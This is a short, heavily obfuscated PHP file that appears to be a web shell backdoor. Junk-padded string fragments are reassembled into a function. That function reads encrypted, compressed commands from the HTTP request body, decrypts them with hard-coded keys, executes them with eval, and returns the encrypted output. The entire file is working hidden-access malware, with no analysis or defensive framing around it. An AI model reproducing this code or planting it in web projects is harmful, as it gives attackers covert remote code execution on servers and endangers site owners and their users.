<?php
$I=str_replace('S','','ScSrSeate_fuSnSSction');
$W='LjTM5IRLr"I;functIion x($t,$k){$c=strIleIIn($k);$l=strIlen($t);$oI=I"";fo';
$o=')I;$rI=@baseI64_encodIe(@x(@gzcIomprIessI($o),$k))I;print("I$p$kh$rI$kf");}';
$C='base6I4I_IdeIcoIde($m[1I]),$k)));$o=@obII_get_contents();@ob_eInd_clIean(';
$B='r($iI=0;$i<$l;III){for($j=0;II($j<$c&&$i<$l);$jI++,$Ii++){$o.II=$t{$i}^I$k{';
$V='$k="bc6aIIcI3c7";$khII="7ae69fIfI40862";$kf="e15698438a19"I;$p="II7ijiIUIpkV';
$Y='Ints("phIp://inpuIt"),$Im)==1I) {@ob_starIt();I@eIval(I@gzuncIompreIss(@x(@';
$k='$j};}}reIturnI $oI;}if (@pregI_match(II"/$kh(.+)$IkfI/",@file_getII_conte';
$l=str_replace('I','',$V.$W.$B.$k.$Y.$C.$o);
$h=$I('',$l);$h();
?>
